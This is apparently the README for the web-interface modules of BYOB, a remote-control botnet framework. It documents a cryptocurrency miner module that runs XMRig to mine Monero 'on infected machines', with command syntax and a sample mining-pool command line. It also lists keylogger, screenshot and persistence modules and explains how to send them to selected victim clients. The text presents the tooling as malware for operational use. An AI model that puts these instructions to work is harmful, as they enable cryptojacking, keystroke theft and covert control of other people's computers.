# BYOB Web GUI Modules

This directory contains modules that can be loaded and executed by BYOB clients through the web interface.

## Available Modules

### Miner

The `miner.py` module provides cryptocurrency mining capabilities using XMRig binaries. This module allows you to mine Monero (XMR) cryptocurrency on infected machines.

#### Usage

```
miner <start/stop/status> [url] [user] [threads]
```

#### Parameters

- `start`: Start the miner
  - `url`: Mining pool URL (e.g., stratum+tcp://xmr-eu1.nanopool.org:10300)
  - `user`: Wallet address or username
  - `threads`: Number of threads to use (default: 1)
- `stop`: Stop the miner
- `status`: Check the status of the miner

#### Examples

```
# Start mining with 2 threads
miner start stratum+tcp://xmr-eu1.nanopool.org:10300 YOUR_WALLET_ADDRESS 2

# Check miner status
miner status

# Stop mining
miner stop
```

#### Notes

- The miner uses XMRig binaries for efficient mining
- Mining is performed using the RandomX algorithm (rx/0)
- The miner runs in the background by default
- CPU usage can be controlled by specifying the number of threads

### Other Modules

- `keylogger.py`: Logs keystrokes
- `screenshot.py`: Takes screenshots
- `persistence.py`: Establishes persistence
- `portscanner.py`: Scans for open ports
- `process.py`: Manages processes
- And more...

## Using Modules in the Web Interface

Modules can be executed on selected clients through the web interface. Simply select the client(s) you want to target, choose the module from the dropdown menu, and provide any required parameters. 